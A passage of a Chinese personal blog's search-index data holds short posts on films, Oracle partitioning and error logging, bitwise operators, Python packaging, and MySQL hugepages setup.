","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:5","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#女主引流死亡男主悲痛"},{"categories":["blog"],"content":" 大众的评论 大家对这对夫妇褒贬不一。 有的人深思，有的人无所谓，有的人缅怀，有的人不愿意再提起。 世界就是这样的，你就是男主角。别人永远都是别人。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:2:6","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#大众的评论"},{"categories":["blog"],"content":" 总结","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:3:0","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#总结"},{"categories":["blog"],"content":" 电影评价 电影中关于 精神病人 的片段一定要仔细观看，算是剧情的点睛之笔。完美解释了当时男女主角的内心。 演技都非常好，电影的拍摄也很好。 我给 8 分以上，希望还能有这样的好电影啊。 精神病人的父亲，就像是我这样的观众。心里有想法，却不再去辩驳。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:3:1","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#电影评价"},{"categories":["blog"],"content":" 今天看到相关的话语 有人說：人這輩子壹共會死三次。第壹次是妳的心臟停止跳動，那麽從生物的角度來說，妳死了；第二次是在葬禮上，認識妳的人都來祭奠，那麽妳在社會上的地位就死了；第三次是在最後壹個記得妳的人死後，那妳就真的死了。 亨利·大卫·梭罗曾言：大部分人过着默默而绝望的生活，带着心中尚存的歌谣，走进坟墓。（Most men lead lives of quiet desperation and go to the grave with the song still in them.) 好好消化一下这个电影，让自己拥有更美好的生活吧。 ","date":"2019-03-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/:3:2","series":null,"tags":["blog","影片"],"title":"电影_革命之路","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%94%B5%E5%BD%B1_%E9%9D%A9%E5%91%BD%E4%B9%8B%E8%B7%AF/#今天看到相关的话语"},{"categories":["blog"],"content":"很喜欢王家卫的电影。有格调，而不是装。常常会拿来翻看。感受都是不一样的","date":"2019-01-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/","series":null,"tags":["blog","影片"],"title":"王家卫","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/"},{"categories":["blog"],"content":" 简介lines 很喜欢王家卫的电影。有格调，而不是装。常常会拿来翻看。感受都是不一样的。 ","date":"2019-01-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/:1:0","series":null,"tags":["blog","影片"],"title":"王家卫","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/#简介"},{"categories":["blog"],"content":" 蓝莓之夜当女主站在楼下，望着窗户，心里的旁白 该怎么和一个不想分别的道别呢？所以我会不说再见 ","date":"2019-01-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/:1:1","series":null,"tags":["blog","影片"],"title":"王家卫","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/#蓝莓之夜"},{"categories":["blog"],"content":" 摄氏零度 (春光乍泄纪录片)坐在拍片房间里，只剩下她自己一人的旁白 在记忆里的感觉是潮湿的，感觉都是软软的 有点，生命感很严重。好像有生命，可是有点生病 不晒太阳的那种感觉 当他们两最后一次分开时候 次次你说要来就来，要走就走。我都没有哼过一声 但我想过了，这是最后一次 为什么次次都是我做不开心的那个，你做走的那个 其实我也可以的阿，我不舍得罢了 这次我想调换一下位置,我走先 当知道自杀死掉了以后 我知道我和他不会再见，所以我留了一个纪念给他(他自己的护照，让他们永远不能分开) ","date":"2019-01-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/:1:2","series":null,"tags":["blog","影片"],"title":"王家卫","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%8E%8B%E5%AE%B6%E5%8D%AB/#摄氏零度-春光乍泄纪录片"},{"categories":null,"content":"About Me","date":"2019-01-02","objectID":"/about/","series":null,"tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"联系方式: Wechat: kentxxq Github: kentxxq Email: base64 decode ODA1NDI5NTA5QHFxLmNvbQ== ","date":"2019-01-02","objectID":"/about/:0:0","series":null,"tags":null,"title":"About Me","uri":"/about/#"},{"categories":["blog"],"content":"oracle普通表转分区表","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/"},{"categories":["blog"],"content":" 简介oracle 有很多的版本，现在的话，常用的有 11g，12cR1/R2。都有不同的方法 对于数据库，我是不推荐使用外键，存储过程，或者触发器的。除非对数据需要超高度的一致性要求，同时不规范的数据，是属于不允许的 数据库的拓展需要添加 新的集群存储，新的机器部署oracle服务，很难像应用服务器一样动态部署，相反拓展服务器更加简单。承担了这一部分的数据库压力 外键是也是有 性能消耗 的，同时内部加锁，更容易出现 死锁 问题 尽量少的数据库约束，越方便数据之间的 解耦合。否则你会发现所有的表都互相依赖。牵一发而动全身 应用应该知道自己的操作是在干嘛，而不是考虑不周，让写在数据库里的 潜规则 告诉你必须如何 方便 读写分离，更好的解决了数据库写方面的压力，而读数据的锁几乎没有压力 ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:1:0","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#简介"},{"categories":["blog"],"content":" 转换","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:2:0","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#转换"},{"categories":["blog"],"content":" 操作前提 主键 拥有自己的逻辑 id，而不是业务 id 主键。否则不方便以后的水平拓展 使用 oracle 提供的包来检测是否可行 ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:2:1","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#操作前提"},{"categories":["blog"],"content":" 12cR1 和 11g --检查可用性 EXEC DBMS_REDEFINITION.can_redef_table(UNAME =\u003e 'QX_HENGSHAN',TNAME =\u003e 'A20181220_2'); --开始重定义 DBMS_REDEFINITION.START_REDEF_TABLE( uname =\u003e 'STEVE', orig_table =\u003e 'salestable', int_table =\u003e 'int_salestable1, int_salestable2, int_salestable3', col_mapping =\u003e NULL, options_flag =\u003e DBMS_REDEFINITION.CONS_USE_ROWID, part_name =\u003e 'sal03q1,sal03q2,sal03q3', continue_after_errors =\u003e TRUE); --开始拷贝数据 DBMS_REDEFINITION.COPY_TABLE_DEPENDENTS( uname =\u003e 'AKAHALI', orig_table =\u003e 'ST1', int_table =\u003e 'T1', num_errors =\u003e lvn_errs ); --完成重定义 dbms_redefinition.finish_redef_table( uname =\u003e 'AKAHALI', orig_table =\u003e 'ST1', int_table =\u003e 'T1' ); ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:2:2","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#12cr1-和-11g"},{"categories":["blog"],"content":" 12cR2 ALTER TABLE table_name MODIFY table_partitioning_clauses [ filter_condition ] [ ONLINE ] [ UPDATE INDEXES [ ( index { local_partitioned_index | global_partitioned_index | GLOBAL } [, index { local_partitioned_index | global_partitioned_index | GLOBAL } ]... ) ] ] --实例 alter table emp modify partition by range (deptno) interval (10) ( partition p1 values less than (10), partition p2 values less than (20) ) online update indexes (idx_emp_no local); ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:2:3","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#12cr2"},{"categories":["blog"],"content":" 导入","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:3:0","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#导入"},{"categories":["blog"],"content":" 创建分区表 中小型的系统或者 olap 类型适合分区表，后期超大存储，建议用分布式 --一般分区表推荐这样建立两层，了解业务，自己来进行分层 partition by list(center_no) subpartition by list(join_year) subpartition template ( subpartition SP_2014 VALUES ('2014'), subpartition SP_2015 values ('2015'), subpartition SP_2016 values ('2016') ) ( partition p_433127 values ('433127'), partition P_433122 values ('433122'), partition P_433101 values ('433101') ); ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:3:1","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#创建分区表"},{"categories":["blog"],"content":" 减少 log 并插入数据 # 关闭log alter table xxx NOLOGGING; # 加速插入数据 INSERT /*+append*/ into 用户.表名(字段,字段) select ... from xxx # 恢复log ALTER TABLE tt_nh_canhe_members LOGGING; ","date":"2018-12-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/:3:2","series":null,"tags":["blog","oracle"],"title":"oracle-普通表转分区表","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%99%AE%E9%80%9A%E8%A1%A8%E8%BD%AC%E5%88%86%E5%8C%BA%E8%A1%A8/#减少-log-并插入数据"},{"categories":["blog"],"content":"以前对于位运算, 二级制了解的比较少. 这里统一记录一下使用和理解.","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["blog"],"content":" 简介以前对于位运算, 二级制了解的比较少. 这里统一记录一下使用和理解. 主要使用 python 做示范. ","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/:1:0","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/#简介"},{"categories":["blog"],"content":" 内容","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/:2:0","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/#内容"},{"categories":["blog"],"content":" 进制2 进制：逢 2 进 1 8 进制：逢 8 进 1 16 进制：逢 16 进 1 在 C 程序中的表示 (python 中也一样)： 0b101 /*2进制 0b开头*/ 0115 /*8进制 0开头*/ 0xFFF /*16进制 0x开头*/ 转换十进制方法: 个位直接加，十位是进制数的 1 次方，百位是进制数的 2 次方，高位以此类推即可 0b101 = 1 + 0*2 + 1*2*2 0115 = 5 + 1*8 + 1*8*8 0xFAF = 15 + 10*15 + 15*15*15 ","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/:2:1","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/#进制"},{"categories":["blog"],"content":" 位运算符我其实用的不是特别多，见的也不多。但是在很多的官方案例中出现过，比如 python 人脸识别中的跳出循环 if cv2.waitKey(1) \u0026 0xFF == ord('q'): break 先把所有的运算符列出来： \u003c\u003c #左移 \u003e\u003e #右移 | #位或 \u0026 #位与 ^ #位异或 ~ #非 \u003c\u003c #左移 将所有的0和1的位置进行左移，移位之后将空位补0 左移操作相当于乘以2**n，以5 \u003c\u003c 3 为例，相当于5(2*3),结果为40 0b101 变成了 0b101000 # 一个int是4个字节，一个字节是8位(bit)，它存储的大小就是32位 # 如果加了0，超出了32位边界，那么就是溢出了 \u003e\u003e #右移 将所有的0和1的位置进行右移(直接舍弃)，空位正数补0，负数补1 右移操作相当于除以2**n，8 \u003e\u003e 3 相当于8/(2**3)=1 | #位或 0b110 | 0b101 #输出7,即0b111 只要有一位有1就为1，可以用在综合条件 \u0026 #位与 0b110 \u0026 0b011 #输出2，即0b010 相同的位才为1，可以用在linux权限 ^ #位异或 0b1010 ^ 0b1111 #输出5，即0b0101 异或常用于将所有的位反转，相同的位置是0，否则其他的位置变1， ~ #非 ~0b101 #输出2，即0b010 这个是单独运算的，直接就把所有的反转了 ","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/:2:2","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/#位运算符"},{"categories":["blog"],"content":" 理解 cv2.waitKey(1) \u0026 0xFF == ord('q') 查看 python 结果 $ python Python 3.6.3 (default, Oct 16 2017, 17:26:31) [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.37)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e print(ord('q')) 113 查看键盘 q 对应的数字是多少 #include \u003cstdio.h\u003e int main() { char i; scanf(\"%c\", \u0026i); printf(\"i = %d \\n\", i); return 0; } Launching: '/Users/user/kent/c/a.out' Working directory: '/Users/user/kent/c' 1 arguments: argv[0] = '/Users/user/kent/c/a.out' q q = 113 Process exited with status 0 那么推算如下 cv2.waitKey(1) \u0026 0xFF == ord('q') cv2.waitKey(1) \u0026 0xFF == 113 0xFF代表了你键盘上的所有按键都能匹配到(包括一些系统自己拓展的特殊按键)。 当我们按了`q`键,cv2.waitKey(1)得到的就是113的二进制，和0xFF匹配出来的结果就是二进制的113，在任何系统上转换为十进制，都会和右边的十进制113相等。 避免了bug ","date":"2018-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/:2:3","series":null,"tags":["blog","python"],"title":"二进制和位运算","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%92%8C%E4%BD%8D%E8%BF%90%E7%AE%97/#理解-cv2waitkey1--0xff--ordq"},{"categories":["blog"],"content":"在自己的机器还有服务器上面，都应该搭建好pyenv。网络上的教程太多了，但是说的又很乱。所以自己稍微整理一下。这次的目的是写一个及其简单的过程，所以如果有具体问题，请看官方文档","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/"},{"categories":["blog"],"content":" 简介打算自己做一个 python 项目, 然后推到 pypi 上去. 这次的目的记录写一个及其简单的过程，所以如果有具体问题，请看官方文档。 ","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/:1:0","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/#简介"},{"categories":["blog"],"content":" 先看目录结构 $ tree . ├── MANIFEST.in ├── README.md ├── myapp │ ├── 1.txt │ ├── __init__.py │ ├── __pycache__ │ │ ├── __init__.cpython-36.pyc │ │ └── test.cpython-36.pyc │ ├── test.py │ └── txt │ └── 1.txt ├── myapp2 │ └── test222.py └── setup.py 4 directories, 10 files MANIFEST.in 用来记录除了 py 文件外，需要打包的文件 # 包含文件 include README.md # 递归-包含 recursive-include myapp/txt * README.md 一个用来简单介绍的文档 myapp 和 myapp2 都是存放代码 setup.py 是用来安装和打包的主要文件 # -*- coding: utf-8 -*- from setuptools import setup, find_packages setup( name='kentxxq', # 项目名 version='1.0.2', # 版本号 zip_safe=False, # 因为部分工具不支持zip，推荐禁用 packages=find_packages(), # 当前目录下所有的包 include_package_data=True, # 启用清单文件MANIFEST.in install_requires=[ # 依赖列表 \"Scrapy\u003e=1.4.0\", ] # 上传到PyPI所需要的信息 author=\"kentxxq\", author_email=\"我的邮箱@qq.com\", description=\"This is an Example Package\", license=\"PSF\", keywords=\"hello world example examples\", url=\"https://a805429509.github.io/\", ) ","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/:1:1","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/#先看目录结构"},{"categories":["blog"],"content":" 运行打包 python setup.py sdist # 构建物在这里 dist/kentxxq-1.0.2.tar.gz ","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/:1:2","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/#运行打包"},{"categories":["blog"],"content":" 开始安装直接拷贝 dist/kentxxq-1.0.2.tar.gz 到目标机器，进行解压。 python setup.py install ","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/:1:3","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/#开始安装"},{"categories":["blog"],"content":" 安装完成后，查看安装结果 $ tree kentxxq-1.0.2-py3.6.egg kentxxq-1.0.2-py3.6.egg ├── EGG-INFO │ ├── dependency_links.txt │ ├── not-zip-safe │ ├── PKG-INFO │ ├── requires.txt │ ├── SOURCES.txt │ └── top_level.txt └── myapp ├── __init__.py ├── __pycache__ │ ├── __init__.cpython-36.pyc │ └── test.cpython-36.pyc ├── test.py └── txt └── 1.txt 4 directories, 11 files 没有 __init__.py 的 myapp2 是没有打包的。 myapp 中 1.txt 没有进入包内，而 MANIFEST.in 中的记录的 recursive-include myapp/txt * 在包内。 ","date":"2017-10-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/:1:4","series":null,"tags":["blog","python"],"title":"python的文件项目打包","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E7%9A%84%E6%96%87%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/#安装完成后查看安装结果"},{"categories":["blog"],"content":"oracle的DML_Error_Logging特性","date":"2017-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/","series":null,"tags":["blog","oracle"],"title":"oracle-DML_Error_Logging特性","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/"},{"categories":["blog"],"content":" 简介在工作中，常常要进行 oracle 数据的临时备份，还有导入数据的需求。但是却因为在源数据中个别数据不合法，导致无法插入。 功能效果： 把合法的数据导入进入目标表 把不合法的数据插入一张指定的表，并且记录下原因 ","date":"2017-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/:1:0","series":null,"tags":["blog","oracle"],"title":"oracle-DML_Error_Logging特性","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/#简介"},{"categories":["blog"],"content":" 需要用到 dbms 包 (10gR2 后版本支持) SQL\u003e DESC dbms_errlog.create_error_log Parameter Type Mode Default? ------------------- -------- ---- -------- DML_TABLE_NAME VARCHAR2 IN ERR_LOG_TABLE_NAME VARCHAR2 IN Y ERR_LOG_TABLE_OWNER VARCHAR2 IN Y ERR_LOG_TABLE_SPACE VARCHAR2 IN Y SKIP_UNSUPPORTED BOOLEAN IN Y SQL\u003e --默认会创建ERR$_SOURCE表，在``第二个``参数可以自己输入表名 ","date":"2017-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/:1:1","series":null,"tags":["blog","oracle"],"title":"oracle-DML_Error_Logging特性","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/#需要用到-dbms-包-10gr2-后版本支持"},{"categories":["blog"],"content":" 创建源表 source 的目标表 dest BEGIN DBMS_ERRLOG.create_error_log (dml_table_name =\u003e 'SOURCE'); END; ","date":"2017-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/:1:2","series":null,"tags":["blog","oracle"],"title":"oracle-DML_Error_Logging特性","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/#创建源表-source-的目标表-dest"},{"categories":["blog"],"content":" 在 insert 语句后按照固定格式填写 INSERT INTO dest SELECT * FROM source LOG ERRORS INTO err$_source('INSERT') REJECT LIMIT UNLIMITED; ","date":"2017-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/:1:3","series":null,"tags":["blog","oracle"],"title":"oracle-DML_Error_Logging特性","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-dml_error_logging%E7%89%B9%E6%80%A7/#在-insert-语句后按照固定格式填写"},{"categories":["blog"],"content":"在linux中，内存一般是2kb-4kb每页，如果是大内存，那么pagetables将会非常大。cpu在查找使用内存的时候，会比较慢。使用hugepages，一个内存页可以设置为2MB-1GB。从而可以加快对内存的访问速度。2MB-4MB，是适用于100GB一下的内存。1GB则适用于TB级别的内存容量","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介在 linux 中，内存一般是 2kb-4kb 每页，如果是大内存，那么 pagetables 将会非常大。mysql 在查找使用内存的时候，会比较慢。使用 hugepages，一个内存页可以设置为 2MB-1GB。从而可以加快对内存的访问速度。2MB-4MB，是适用于 100GB 一下的内存。 1GB 则适用于 TB 级别的内存容量。 ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 开始配置 mysql 适用 hugepages [mysql@centos1 ~]$ cat /proc/meminfo MemTotal: 1016460 kB MemFree: 557140 kB MemAvailable: 551864 kB Buffers: 948 kB Cached: 121004 kB SwapCached: 0 kB Active: 313228 kB Inactive: 83928 kB Active(anon): 275372 kB Inactive(anon): 6524 kB Active(file): 37856 kB Inactive(file): 77404 kB Unevictable: 0 kB Mlocked: 0 kB SwapTotal: 839676 kB SwapFree: 839676 kB Dirty: 0 kB Writeback: 0 kB AnonPages: 275228 kB Mapped: 28304 kB Shmem: 6692 kB Slab: 35700 kB SReclaimable: 14504 kB SUnreclaim: 21196 kB KernelStack: 2208 kB PageTables: 4344 kB NFS_Unstable: 0 kB Bounce: 0 kB WritebackTmp: 0 kB CommitLimit: 1347904 kB Committed_AS: 1719888 kB VmallocTotal: 34359738367 kB VmallocUsed: 5468 kB VmallocChunk: 34359730176 kB HardwareCorrupted: 0 kB AnonHugePages: 4096 kB HugePages_Total: 0 HugePages_Free: 0 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB DirectMap4k: 32704 kB DirectMap2M: 1015808 kB 上面可以看出没有启用 hugepages，默认 hugepages 每页大小为2mb。 而当前的 pagetables 为4344kB ","date":"1993-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/:1:1","series":null,"tags":["blog","mysql"],"title":"mysql_hugepages配置","uri":"/posts/%E7%AC%94%E8%AE%B0/mysql_hugepages%E9%85%8D%E7%BD%AE/#开始配置-mysql-适用-hugepages"},{"categories":["blog"],"content":" centos 系统设置禁用 thp，在各个数据库的官方文档中都明确指出了透明大页有可能出现各种问题。 设置 hugepages 的个数。加入 mysql 所在的组 (1000) 因为是虚拟机，mac 硬盘休眠，就会造成时间上面的不准确。所以加上了一个时间同步的命令 vi /etc/rc.d/rc.local # 尾部加入 if test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled fi if test -f 